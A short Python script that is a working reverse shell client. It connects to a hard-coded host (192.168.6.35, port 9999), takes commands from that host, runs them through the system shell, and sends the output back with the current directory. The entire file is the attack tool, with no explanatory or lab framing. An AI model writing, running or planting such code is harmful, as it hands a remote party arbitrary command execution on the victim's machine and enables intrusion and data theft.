import socket
import os
import subprocess

def main():
    s = socket.socket()
    host = "192.168.6.35"
    port = 9999
    try:
        s.connect((host, port))
    except socket.error as e:
        print(f"Connection error: {e}")
        return

    while True:
        try:
            data = s.recv(1024).decode("utf-8")
            if data.startswith("cd "):
                try:
                    os.chdir(data.strip()[3:])
                    s.send(str.encode(f"Changed directory to {os.getcwd()}"))
                except FileNotFoundError as e:
                    s.send(str.encode(f"Directory not found: {e}"))
            elif len(data) > 0:
                cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = output_byte.decode("utf-8")
                currentWD = os.getcwd() + ">"
                s.send(str.encode(output_str + currentWD))
                print(output_str)
        except (ConnectionResetError, BrokenPipeError) as e:
            print("Connection lost: " + str(e))
            break
        except Exception as e:
            print("Error while executing command: " + str(e))
            break

if __name__ == "__main__":
    main()
